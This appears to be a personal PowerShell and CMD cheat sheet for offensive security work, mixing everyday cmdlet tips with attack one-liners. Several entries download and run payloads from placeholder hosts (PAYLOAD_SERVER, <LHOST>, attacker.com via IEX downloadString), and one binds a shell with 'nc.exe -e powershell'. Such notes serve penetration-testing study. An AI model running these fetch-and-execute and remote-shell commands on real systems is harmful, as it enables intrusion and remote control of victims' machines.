# PowerShell Movements

## base64 some bytes

```powershell
[convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("hello"))
```
- works for anything that returns the bytes object

## Pull via HTTP

```powershell
Invoke-WebRequest -Uri http://PAYLOAD_SERVER:8000/ -OutFile ./payload.exe 
```

```powershell
iwr -Uri http://PAYLOAD_SERVER:8000/ -OutFile ./payload.exe 
```

# Old Sheet
## PS cheats
- put paths in quotes, because windows is bad !
- get-Service NAME
- Measure-Object										; for counting outputs
- remember you can pipe things!
- verb-noun
- outputs are objects; therefore get-member
- Objects have methods and Properties
- get-content 															; will usually type/cat/ do something
- acl, get-acl															; shows permisions in current dir, such as owner ; ACCESS CONTROL LISTS
- CMDLET | get-member -MemberType Properties/Method 					; gives information on available props/methods
- CMDLET | where-object -property PROP_NAME -operator OPERATOR_PARM		;	 filter output by my specification (always use match operator)
- CMDLET | select-object -property prop1, prop2, ...					;	 limit output fields creates a new object
- dir env:				 												; display environment vars |  format-list Property-Name

	
> find command
```
get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *SEARCH_TERM*
https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ 
```

> grep equivalent; this will search entire filesystem
```
Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
```


> help/search availble actions
```
get-command *SEARCH_TERM*
get-help	CMDLET
```

> filtering outputs
```sh
Verb-Noun | Where-Object -Property PropertyName -operator Value
Verb-Noun | Where-Object {$_.PropertyName -operator Value}			; `$_` is an operator, iterates through every object passed (SYNTAX ERR?)
Verb-Noun | Sort-Object
```


> pull a shell & execute; possibly dont need double quotes?
```sh
CMD.exe>"powershell.exe Invoke-WebRequest -Uri http://<LHOST>:8000/shell.exe -OutFile ./shell.exe && .\shell.exe"
```

> spawn a process
```
Start-Process PROCESS_NAME 'Start-Process cmd -Verb RunAs' -Credential USERNAME
```

> netcat 
```sh
nc.exe -e powershell  		; works just like other shells
```

	
> invoke expression
```sh
IEX(New-Object WebClient).downloadString("http://attacker.com/rev.ps1")
```




## CMD cheats
- type 		== cat
- findstr 	== grep
- dir /a    == ls -a
- ren 										; alias for rename
- rename 									; path needed for source, NOT needed for destination
- copy 										; source destination
- del
- dir
- net stop/start SERVICE_NAME 				; other functions too, see /?
- whoami /all 								; gives some security info, suchas permissions